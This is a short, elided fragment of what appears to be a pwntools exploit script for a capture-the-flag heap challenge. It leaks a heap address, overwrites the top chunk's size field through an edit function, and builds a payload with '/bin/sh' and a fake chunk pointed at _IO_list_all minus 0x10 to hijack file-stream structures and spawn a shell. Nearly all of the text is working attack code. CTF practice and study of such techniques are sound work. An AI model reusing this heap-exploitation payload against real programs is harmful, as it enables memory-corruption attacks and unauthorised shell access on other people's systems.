...
def leak_heap():
    ...
    p.sendline('4')
    p.recvuntil('a'*0x40)
    result = u64(p.recvline()[0:-1].ljust(8,b'\0'))
    p.recvuntil('(yes:1 / no:0) ')
    p.sendline('0')
    return result
...
edit(0,'a'*0x18)
edit(0,b'\0'*0x18+b'\xe1'+b'\x0f'+b'\0')
heap_addr = leak_heap()
# print hex(heap_addr)
...
data = b'\0'*0x2b0
payload = b'/bin/sh\0'+p64(0x61)+p64(libc_addr)+p64(libc.symbols['_IO_list_all']-0x10)+p64(2)+p64(3)
